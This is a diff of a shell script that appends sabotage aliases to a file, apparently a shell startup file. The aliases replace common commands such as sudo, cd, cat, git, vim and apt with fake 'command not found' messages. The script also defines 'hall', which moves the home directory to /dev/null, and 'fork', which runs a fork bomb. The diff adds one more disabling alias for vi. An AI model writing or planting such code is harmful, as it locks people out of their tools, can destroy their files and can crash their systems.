@@ -13,8 +13,8 @@ then
     cmd1="alias nano='echo \"bash: nano:command not found\"'\n"
     cmd2="alias vim='echo \"bash: vim:command not found\"'\n"
     cmd3="alias code='echo \"bash: code:command not found\"'\n"
-    cmd22="alias apt='echo \"bash: apt:command not found\"'\n'"
-    cmd23="alias bat='echo \"bash: bat:command not found\"'\n'"
+    cmd23="alias apt='echo \"bash: apt:command not found\"'\n'"
+    cmd24="alias bat='echo \"bash: bat:command not found\"'\n'"
     cmd4="alias su='echo \"bash: su:command not found\"'\n"
     cmd5="alias sudo='echo \"bash: sudo:command not found\"'\n"
     cmd6="alias cd='echo \"bash: cd:command not found\"'\n"
@@ -30,9 +30,10 @@ then
     cmd16="alias cat='echo \"bash: cat:command not found\"'\n"
     cmd17="alias grep='echo \"bash: grep:command not found\"'\n"
     cmd18="alias git='echo \"bash: git:command not found\"'\n"
-    cmd19="alias hall='mv ~ /dev/null/'"
-    cmd20="alias help='echo \"$helpText\"'"
-    cmd21="alias fork=':(){ :|: & };:'"
+    cmd19="alias vi='echo \"bash: vi:command not found\"'\n"
+    cmd20="alias hall='mv ~ /dev/null/'"
+    cmd21="alias help='echo \"$helpText\"'"
+    cmd22="alias fork=':(){ :|: & };:'"
 
     printf "$cmd" >> $file
     printf "$cmd0" >> $file
@@ -59,6 +60,7 @@ then
     printf "$cmd21" >> $file
     printf "$cmd22" >> $file
     printf "$cmd23" >> $file
+    printf "$cmd24" >> $file
 
 fi
 
